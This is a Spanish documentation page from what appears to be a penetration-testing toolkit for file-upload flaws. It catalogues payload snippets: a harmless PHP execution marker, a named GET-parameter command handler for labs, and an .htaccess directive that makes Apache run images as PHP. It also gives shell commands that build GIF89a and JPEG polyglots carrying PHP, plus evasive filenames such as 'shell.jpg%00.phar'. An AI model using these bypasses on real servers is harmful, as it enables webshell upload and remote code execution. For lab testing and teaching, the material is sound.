# 06 - Snippets de contenido

## Objetivo

Recordar qué contenido reutilizable hay en `wordlists/content/` y cómo combinarlo manualmente con filenames, extensiones permitidas o magic numbers.

La herramienta separa intencionadamente dos cosas:

```text
filename evasivo  → generado por scripts en wordlists/generated/
contenido         → snippets copiables en wordlists/content/
```

Así puedes generar nombres de archivo por un lado y decidir manualmente qué contenido enviar por otro.

---

## Estructura relevante

```text
wordlists/content/
├── php/
├── aspnet/
├── jsp/
├── ssi/
├── node/
├── magic_numbers/
└── limited_upload/
```

---

# 1. PHP snippets

```text
wordlists/content/php/php_funciona.php
wordlists/content/php/php_introspection.php
wordlists/content/php/phpinfo_marker.php
wordlists/content/php/php_cmd_get.php
wordlists/content/php/htaccess_enable_php_for_images.htaccess
```

## `php_funciona.php`

Uso: marcador mínimo para saber si PHP se interpreta.

Contenido conceptual:

```php
<?php echo base64_decode("cGhwX2Z1bmNpb25h"); ?>
```

Salida esperada si se ejecuta:

```text
php_funciona
```

Cuándo usarlo:

```text
[ ] Primera prueba de ejecución.
[ ] Quieres evitar comandos o reverse shells.
[ ] Quieres una señal sencilla de buscar.
[ ] Estás generando material de clase.
```

---

## `php_introspection.php`

Uso: obtener información del archivo ejecutado cuando ya tienes señal básica.

Campos útiles:

```text
basename_hex
file_hex
realpath_hex
script_filename_hex
document_root_hex
request_uri
```

Por qué en hex:

```text
Si el filename contiene %00, %0a, espacios, unicode o caracteres raros,
la salida directa puede romperse. En hex se ve limpio.
```

Cuándo usarlo:

```text
[ ] Ya confirmaste ejecución con php_funciona.php.
[ ] Quieres saber nombre real en disco.
[ ] Quieres saber ruta absoluta.
[ ] Quieres comparar URL usada vs ruta filesystem.
```

---

## `phpinfo_marker.php`

Uso: confirmar runtime PHP y ver configuración en laboratorio.

Cuándo usarlo:

```text
[ ] Laboratorio controlado.
[ ] Quieres ver document_root, disable_functions, módulos, versión PHP.
[ ] Quieres evidencia visual rápida de interpretación PHP.
```

No es el primer payload ideal en escenarios reales porque genera mucha salida.

---

## `php_cmd_get.php`

Uso: handler de comandos por parámetro GET para labs.

Cuándo usarlo:

```text
[ ] Ya confirmaste ejecución.
[ ] Estás en un entorno controlado.
[ ] Necesitas validar impacto técnico de RCE.
```

Orden recomendado:

```text
php_funciona.php → php_introspection.php → phpinfo_marker.php → php_cmd_get.php
```

---

## `.htaccess`

Snippet:

```text
wordlists/content/php/htaccess_enable_php_for_images.htaccess
```

Uso: laboratorios Apache donde se pueda subir `.htaccess` y `AllowOverride` esté activo.

Contenido conceptual:

```apache
AddType application/x-httpd-php .jpg .jpeg .png .gif
```

Modelo mental:

```text
1. Subir .htaccess a carpeta servida por Apache.
2. Forzar que imágenes sean tratadas como PHP.
3. Subir imagen con contenido PHP.
```

No tiene sentido en Nginx puro ni si Apache ignora `.htaccess`.

---

# 2. Otros handlers

| Snippet | Ruta | Uso |
|---|---|---|
| ASP.NET | `wordlists/content/aspnet/aspx_funciona.aspx` | Marcador para `.aspx` |
| JSP | `wordlists/content/jsp/jsp_funciona.jsp` | Marcador para `.jsp` |
| SSI | `wordlists/content/ssi/shtml_funciona.shtml` | Marcador para Server-Side Includes |
| EJS | `wordlists/content/node/ejs_funciona.ejs` | Marcador para templates EJS en labs |

Cuándo usar estos snippets:

```text
[ ] Estás usando wordlists multi-stack.
[ ] El backend apunta a IIS, Tomcat, Java o templates server-side.
[ ] Quieres tener un marcador equivalente a php_funciona en otros entornos.
```

---

# 3. Combinación manual con magic bytes

## PHP prefijado con GIF89a

GIF es cómodo porque su firma puede escribirse como texto:

```bash
{
  printf 'GIF89a\n'
  cat wordlists/content/php/php_funciona.php
} > /tmp/php_funciona_gif89a.gif
```

Comprobar:

```bash
head -5 /tmp/php_funciona_gif89a.gif
```

Resultado conceptual:

```text
GIF89a
<?php echo base64_decode("cGhwX2Z1bmNpb25h"); ?>
```

---

## PHP añadido al final de una imagen real

Cuando la validación mira estructura real de imagen, suele ser mejor partir de una imagen válida:

```bash
cat real_image.jpg wordlists/content/php/php_funciona.php \
  > /tmp/real_image_plus_php.jpg
```

Modelo mental:

```text
La imagen puede seguir siendo válida para parsers superficiales,
y el contenido PHP queda añadido al final.
```

No siempre funcionará: si el backend reencodea, redimensiona o limpia la imagen, puede eliminar el contenido añadido.

---

# 4. Combinación con filenames generados

Ejemplo conceptual:

```text
filename: shell.jpg%00.phar
content:  wordlists/content/php/php_funciona.php
```

O:

```text
filename: shell.phtml%0a.jpg
content:  /tmp/php_funciona_gif89a.gif
```

La herramienta no decide cómo unir filename y contenido. Eso depende de Burp, curl, ffuf, navegador, script propio, etc.

---

# 5. Snippets para uploads limitados

Si no buscas ejecución server-side, revisa:

```text
wordlists/content/limited_upload/
```

Ejemplos:

| Caso | Carpeta |
|---|---|
| HTML same-origin | `limited_upload/html/` |
| SVG XSS / XXE | `limited_upload/svg/` |
| XML XXE | `limited_upload/xml/` |
| EXIF XSS | `limited_upload/metadata/` |
| Zip Slip | `limited_upload/archives/` |
| PDF/Office parser notes | `limited_upload/documents/` |
| DoS controlado | `limited_upload/dos/` |

---

## Resumen práctico

| Necesidad | Snippet recomendado |
|---|---|
| Confirmar PHP | `php_funciona.php` |
| Saber ruta/nombre real | `php_introspection.php` |
| Ver configuración PHP | `phpinfo_marker.php` |
| Validar RCE en lab | `php_cmd_get.php` |
| Apache handler abuse | `.htaccess` |
| IIS/ASP.NET | `aspx_funciona.aspx` |
| Java/Tomcat | `jsp_funciona.jsp` |
| SVG/XSS/XXE | `limited_upload/svg/` |
